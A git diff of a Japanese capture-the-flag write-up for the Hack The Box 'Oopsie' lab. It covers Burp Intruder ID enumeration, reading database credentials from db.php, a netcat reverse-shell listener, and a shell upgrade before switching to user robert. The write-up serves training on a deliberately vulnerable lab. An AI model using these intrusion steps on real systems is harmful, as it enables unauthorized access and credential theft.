@@ -35,12 +35,17 @@ GET /cdn-cgi/login/admin.php?content=accounts&id=1
 このことから，id=の後の数字を変えることで，ログインしているユーザを変えることができることに気づく．
 そこで，Burpで自動にそれらをしてくれるIntruderにこの通信内容を投げる(Proxy->HTTP history から該当の通信を右クリック->IntruderまたはCtrl-I)．
 また，下準備にターミナルで以下を入力し，出力をコピーしておく(forループで1~100までの数字を出力するだけ)．
+
 ```
 for x in $(seq 1 100);do echo $x;
 ```
 Intruder->Payload Options\[Simple list\]の欄に張り付け，Optionタブから，Redirections->Follow redirectionsをAlwaysにし，Process cookies in redirectionsにチェックを入れる．
 
-![IDの変更](./pictures/Ooposie/p1.png "Burp1")
+attackをクリックし，
+
+
+
+![IDの変更](./pictures/Oopsie/p1.png "Burp1")
 
 
 
@@ -79,7 +84,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 2021/07/20 11:26:48 Finished
 ===============================================================
-```  
+```
 
 
 
@@ -102,8 +107,7 @@ admin.php
 db.php
 index.php
 script.js
-$ cat /var/www/html/cdn-login/db.php
-cat: /var/www/html/cdn-login/db.php: No such file or directory
+
 $ cat /var/www/html/cdn-cgi/login/db.php
 <?php
 $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
@@ -307,15 +311,7 @@ $ python3 -c 'import pty; pty.spawn*
 > ^Z
 zsh: suspended  nc -lnvp 1234
                                                                                                              
-┌──(kali㉿kali)-[~/Documents/htb/starting_point]
-└─$ nc -lnvp 1234                                                                                  148 ⨯ 2 ⚙
-listening on [any] 1234 ...
-connect to [10.10.14.176] from (UNKNOWN) [10.10.10.28] 51204
-Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
- 09:23:27 up  3:23,  0 users,  load average: 0.00, 0.00, 0.00
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
+
 $ SHELL=/bin/bash script -q /dev/null
 www-data@oopsie:/$ su robert
 su robert
